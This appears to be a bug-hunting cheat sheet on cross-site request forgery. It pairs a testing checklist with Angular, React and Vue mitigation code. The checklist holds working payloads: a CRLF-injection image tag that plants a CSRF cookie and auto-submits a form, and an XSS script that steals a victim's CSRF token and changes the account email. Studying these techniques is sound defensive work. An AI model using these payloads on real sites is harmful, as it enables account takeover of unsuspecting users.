# Cross-site request forgery (CSRF)
> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
## First:
Referrer: https://example.com
if:
"Invalid referrer header" so:
```http
Referrer-Policy: unsafe-url
```
Invalid referrer validation, so:
```html
<meta name="referrer" content="no-referrer">
```
## Then:
1) csrf without csrf protection.
2) csrf validation depends on request method  - Change post to get.
3) csrf delete csrf parameter and value.
4) csrf - drop request and test the token in other session.
5) csrf + crlf - /?search=test%0d%0aSet-Cookie:%20csrfKey=your-key.
```html
<img src="https://domain/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()">
```
6) csrf + xss
```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script> 
```

### Angular Mitigation

```js
@NgModule({
  imports: [
    BrowserModule,
    HttpClientModule,
    HttpClientXsrfModule.withOptions({
      cookieName: 'My-XSRF-Cookie',
      headerName: 'My-XSRF-Header',
    }),
  ],
  bootstrap: [PhoneFormComponent],
  declarations: [PhoneFormComponent],
})
```

### React Mitigation

```js
const onSubmit = () => {
    const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

    fetch('https://www.sparkpay.com/api/phone', {
      method: 'PUT',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken,
      },
      body: JSON.stringify({
        phone: phone,
      }),
    });
  };
```

### Vue Mitigation

```js
<script>
  module.exports = {
    data: {
      phone: '',
    },

    methods: {
      submitForm: function () {
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

        fetch('https://www.sparkpay.com/api/phone', {
          method: 'PUT',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-XSRF-TOKEN': csrfToken,
          },
          body: JSON.stringify({
            phone: this.phone,
          }),
        });
      }
    },
  };
</script>
```

### Avoid

What you should never do

```js
<script>
  fetch('https://www.sparkpay.com/api/phone', {
    method: 'PUT',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: '{"phone": "07739364408"}',
  });
</script>
```

## Reference:
https://application.security/free-application-security-training/vue-cross-site-request-forgery
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
